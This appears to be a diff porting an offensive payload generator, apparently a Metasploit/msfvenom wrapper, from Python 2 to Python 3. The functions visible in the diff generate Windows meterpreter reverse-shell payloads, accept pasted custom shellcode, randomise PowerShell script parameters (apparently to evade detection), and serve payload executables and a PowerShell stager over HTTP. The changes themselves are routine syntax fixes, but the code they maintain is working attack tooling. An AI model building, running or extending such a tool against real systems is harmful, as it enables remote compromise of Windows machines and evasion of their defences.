@@ -1,5 +1,3 @@
-# -*- coding: utf-8 -*-
-from __future__ import unicode_literals
 import os
 import socket
 import re
@@ -7,13 +5,13 @@ import subprocess
 import sys
 import blessed
 import random
-import SimpleHTTPServer
-import SocketServer
+import http.server
+import socketserver
 import multiprocessing
 import time
 import string
 import prompt_toolkit
-from prompt_toolkit.contrib.completers import WordCompleter
+from prompt_toolkit.completion import WordCompleter
 import netifaces
 
 t = blessed.Terminal()
@@ -54,7 +52,7 @@ using System;using System.Runtime.InteropServices;public class Win32 {[DllImport
 """
 
 
-class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class HANDLER(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return
 
@@ -99,7 +97,7 @@ class InterfaceSelecta():
                     currentinterface = t.bold_green + ' *'
                 else:
                     currentinterface = ''
-                print t.bold_yellow + str(i['num']) +  ': ' + t.normal + i['addr'] + ' (' + i['interface'] + ')' + currentinterface
+                print(t.bold_yellow + str(i['num']) +  ': ' + t.normal + i['addr'] + ' (' + i['interface'] + ')' + currentinterface)
 
             while True:
                 interinput = prompt_toolkit.prompt("Interface > ", completer=WordCompleter([str(x+1) for x in range(self.num-1)]), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}))
@@ -134,10 +132,10 @@ class Spinner(object):
         self.x = 0
 
     def Looper(self, text):
-        print t.bold_green,
+        print(t.bold_green, end=' ')
         sys.stdout.write('\r')
         sys.stdout.write(text)
-        print t.normal,
+        print(t.normal, end=' ')
         sys.stdout.flush()
 
     def Update(self):
@@ -169,9 +167,9 @@ def windows_met_rev_shell_dns(ip, port):
 
 def windows_custom_shellcode():
     customshell = ''
-    print 'Paste custom shellcode below\nType \'END\' when done.'
+    print('Paste custom shellcode below\nType \'END\' when done.')
     while True:
-        buildstr = raw_input().rstrip()
+        buildstr = input().rstrip()
         if buildstr == 'END':
             break
         else:
@@ -276,7 +274,7 @@ def randomisePS1(filename):
             ps1Content = ps1Content.replace(j, cleanNewArg)
             newFileChanges['params'][j.replace('$', '')] = newParam
 
-        for param, newParam in newFileChanges['params'].items():
+        for param, newParam in list(newFileChanges['params'].items()):
             paramSearchRegex = paramRegex.format(param.replace('$', ''))
             changeParam = paramRegex.format(newParam).replace('\\', '')
             regSearch = re.findall(paramSearchRegex, ps1Content)
@@ -293,7 +291,7 @@ def randomisePS1(filename):
         return newFileChanges
 
 def sandboxChoose(choice):
-    from menu import sandboxMenuOptions, getAndRunSandboxMenu
+    from .menu import sandboxMenuOptions, getAndRunSandboxMenu
     if sandboxMenuOptions[choice]['availablemodules']:
         sandboxMenuOptions[choice]['availablemodules'] = None
     else:
@@ -309,7 +307,7 @@ def msfvenomGeneration(payload, ip, port):
     while p.poll() == None:
         LOADING.Update()
         time.sleep(0.2)
-    print '\r',
+    print('\r', end=' ')
     sys.stdout.flush()
 
     payload = p.stdout.read()
@@ -320,7 +318,7 @@ def msfvenomGeneration(payload, ip, port):
 
 def getHelp(*helpItem):
     helpItem = ''.join(helpItem)
-    if helpDict.has_key(helpItem):
+    if helpItem in helpDict:
         return helpDict[helpItem]
     else:
         return t.bold_red + '[!] Enter a valid menu option to recieve help'
@@ -340,23 +338,23 @@ def powershellShellcodeLayout(powershellExec):
 def ServePayload(payloaddirectory, IP, port):
     try:
         os.chdir(payloaddirectory)
-        httpd = SocketServer.TCPServer((IP, port), HANDLER)
+        httpd = socketserver.TCPServer((IP, port), HANDLER)
         httpd.serve_forever()
     except KeyboardInterrupt:
         pass
     except:
-        print t.bold_red + '\n[*] Port in use' + t.normal
+        print(t.bold_red + '\n[*] Port in use' + t.normal)
 
 def DoServe(IP, payloadname, payloaddir, port, printIt):
     if printIt:
-        print t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal
+        print(t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal)
     a = multiprocessing.Process(
         target=ServePayload, args=(payloaddir, IP, port))
     a.daemon = True
     a.start()
 
 def randomUnusedPort():
-    from menu import returnIP
+    from .menu import returnIP
     s = socket.socket()
     s.bind((returnIP(), 0))
     port = s.getsockname()[1]
@@ -364,13 +362,13 @@ def randomUnusedPort():
     return port
 
 def stagePowershellCode(powershellFileContents, port, dir='stager'):
-    from menu import returnIP
+    from .menu import returnIP
     if not os.path.isdir(dir):
         os.mkdir(dir)
     os.chdir(dir)
     with open('stage.ps1', 'w') as psFile:
         psFile.write(powershellFileContents)
-    httpd = SocketServer.TCPServer((returnIP(), port), HANDLER)
+    httpd = socketserver.TCPServer((returnIP(), port), HANDLER)
     httpd.handle_request()
     os.chdir('..')
     import shutil
